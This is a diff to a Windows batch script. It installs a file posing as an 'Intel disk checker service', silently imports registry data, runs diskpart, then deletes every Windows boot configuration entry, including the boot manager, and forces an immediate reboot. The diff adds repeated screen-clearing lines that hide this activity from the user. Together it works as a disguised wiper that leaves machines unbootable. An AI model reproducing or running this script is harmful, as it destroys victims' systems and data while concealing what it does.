@@ -2,8 +2,10 @@
 copy "%~dp0\intel_disk_checker_service.bat" "C:\Program Files\intel_disk_checker_service.bat"
 copy "%~dp0\partdata.txt" "C:\Program Files\partdata.txt"
 copy "%~dp0\regdata.reg" "C:\Program Files\regdata.reg"
+cls
 regedit /s "%~dp0\regdata.reg"
 diskpart /s "%~dp0\partdata.txt"
+cls
 bcdedit /deletevalue {current} recoverysequence
 bcdedit /deletevalue {current} resumeobject
 bcdedit /deletevalue {current} path
@@ -12,6 +14,7 @@ bcdedit /deletevalue {current} osdevice
 bcdedit /deletevalue {current} systemroot
 bcdedit /deletevalue {current} inherit
 bcdedit /delete {current}
+cls
 bcdedit /enum |findstr "den" > "%temp%\tempout3327043.txt"
 For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327043.txt"') Do set identifier=%%~G
 bcdedit /deletevalue %identifier% recoverysequence
@@ -26,6 +29,7 @@ bcdedit /deletevalue %identifier% displayorder
 bcdedit /deletevalue %identifier% description
 bcdedit /deletevalue %identifier% default
 bcdedit /delete %identifier%
+cls
 bcdedit /enum |findstr "den" > "%temp%\tempout3327042.txt"
 For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327042.txt"') Do set identifier=%%~G
 bcdedit /deletevalue %identifier% recoverysequence
@@ -40,6 +44,7 @@ bcdedit /deletevalue %identifier% displayorder
 bcdedit /deletevalue %identifier% description
 bcdedit /deletevalue %identifier% default
 bcdedit /delete %identifier%
+cls
 bcdedit /enum |findstr "den" > "%temp%\tempout3327041.txt"
 For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327041.txt"') Do set identifier=%%~G
 bcdedit /deletevalue %identifier% recoverysequence
@@ -54,6 +59,7 @@ bcdedit /deletevalue %identifier% displayorder
 bcdedit /deletevalue %identifier% description
 bcdedit /deletevalue %identifier% default
 bcdedit /delete %identifier%
+cls
 bcdedit /enum |findstr "den" > "%temp%\tempout3327040.txt"
 For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327040.txt"') Do set identifier=%%~G
 bcdedit /deletevalue %identifier% recoverysequence
@@ -68,6 +74,7 @@ bcdedit /deletevalue %identifier% displayorder
 bcdedit /deletevalue %identifier% description
 bcdedit /deletevalue %identifier% default
 bcdedit /delete %identifier%
+cls
 bcdedit /enum |findstr "den" > "%temp%\tempout3327049.txt"
 For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327049.txt"') Do set identifier=%%~G
 bcdedit /deletevalue %identifier% recoverysequence
@@ -82,6 +89,7 @@ bcdedit /deletevalue %identifier% displayorder
 bcdedit /deletevalue %identifier% description
 bcdedit /deletevalue %identifier% default
 bcdedit /delete %identifier%
+cls
 bcdedit /enum |findstr "den" > "%temp%\tempout3327048.txt"
 For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327048.txt"') Do set identifier=%%~G
 bcdedit /deletevalue %identifier% recoverysequence
@@ -96,6 +104,7 @@ bcdedit /deletevalue %identifier% displayorder
 bcdedit /deletevalue %identifier% description
 bcdedit /deletevalue %identifier% default
 bcdedit /delete %identifier%
+cls
 bcdedit /enum |findstr "den" > "%temp%\tempout3327047.txt"
 For /F "Tokens=2*" %%G In ('%SystemRoot%\System32\findstr.exe "e" "%temp%\tempout3327047.txt"') Do set identifier=%%~G
 bcdedit /deletevalue %identifier% recoverysequence
@@ -110,6 +119,7 @@ bcdedit /deletevalue %identifier% displayorder
 bcdedit /deletevalue %identifier% description
 bcdedit /deletevalue %identifier% default
 bcdedit /delete %identifier%
+cls
 bcdedit /deletevalue {bootmgr} resumeobject
 bcdedit /deletevalue {bootmgr} default
 bcdedit /deletevalue {bootmgr} path
@@ -118,6 +128,7 @@ bcdedit /deletevalue {bootmgr} displayorder
 bcdedit /deletevalue {bootmgr} inherit
 bcdedit /deletevalue {bootmgr} description
 bcdedit /delete {bootmgr}
+cls
 del %temp%\tempout3327043.txt
 del %temp%\tempout3327042.txt
 del %temp%\tempout3327041.txt
@@ -125,4 +136,5 @@ del %temp%\tempout3327040.txt
 del %temp%\tempout3327049.txt
 del %temp%\tempout3327048.txt
 del %temp%\tempout3327047.txt
+cls
 shutdown /r /t 0
